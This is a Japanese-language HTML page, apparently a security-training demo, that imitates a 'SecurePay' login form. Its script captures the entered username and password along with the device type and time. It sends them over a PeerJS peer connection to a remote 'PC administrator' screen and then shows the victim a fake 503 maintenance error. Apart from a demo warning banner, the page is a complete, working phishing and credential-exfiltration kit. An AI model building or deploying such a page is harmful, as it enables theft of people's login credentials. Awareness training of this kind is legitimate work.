<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ログイン | セキュリティ確認（デモ）</title>
  <link rel="stylesheet" href="style.css">
  <!-- PeerJSの読み込み -->
  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
</head>
<body class="victim-body">
  
  <div class="demo-warning">
    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。実際の情報やパスワードは入力しないでください。
  </div>

  <div class="login-container" id="login-box">
    <div class="mock-logo">
      <span class="logo-icon">🛡️ S</span>
      <span>SecurePay</span>
    </div>

    <h2>アカウントログイン</h2>
    <p class="subtitle">サービスをご利用いただくにはログインが必要です</p>
    
    <form id="login-form">
      <div class="input-group">
        <label>ユーザーID / メールアドレス</label>
        <input type="text" id="username" placeholder="example@email.com" required>
      </div>
      <div class="input-group">
        <label>パスワード</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>
      <button type="submit" class="btn-primary">ログイン</button>
    </form>
    <div style="margin-top: 15px; font-size: 11px; color: #888;" id="conn-status">PC管理者との接続待機中...</div>
  </div>

  <div class="login-container hidden" id="error-box">
    <div class="error-icon">⚠️</div>
    <h3 style="color: #d9534f;">HTTP 503 Service Unavailable</h3>
    <p>現在システムメンテナンス中です。<br>恐れ入りますが、しばらく時間を置いてから再度お試しください。</p>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const hostId = urlParams.get('room'); // PC側のルームIDを取得

    let peer = new Peer();
    let conn = null;

    peer.on('open', () => {
      if (hostId) {
        document.getElementById('conn-status').innerText = "PCへ接続中...";
        // PC（ホスト）に接続を確立する
        conn = peer.connect("sec-demo-" + hostId, { reliable: true });
        
        conn.on('open', () => {
          document.getElementById('conn-status').innerText = "接続完了（リアルタイム送信可能）";
          document.getElementById('conn-status').style.color = "#2ed573";
        });
      } else {
        document.getElementById('conn-status').innerText = "⚠️ 接続先IDがありません（QRコード等からアクセスしてください）";
      }
    });

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      if (ua.includes("iPhone")) return "iPhone (iOS)";
      if (ua.includes("iPad")) return "iPad (iOS)";
      if (ua.includes("Android")) return "Androidスマホ";
      if (ua.includes("Windows")) return "Windows PC";
      if (ua.includes("Mac")) return "Mac PC";
      return "不明な端末";
    }

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const device = getDeviceInfo();
      const time = new Date().toLocaleTimeString();

      const stolenData = { time, device, username, password };

      // PC（管理者画面）へダイレクトにデータを送信！
      if (conn && conn.open) {
        conn.send(stolenData);
      } else {
        alert("PCとの接続が確立されていません。");
      }

      // 被害者にはメンテナンスエラー画面を表示
      document.getElementById('login-box').classList.add('hidden');
      document.getElementById('error-box').classList.remove('hidden');
    });
  </script>
</body>
</html>
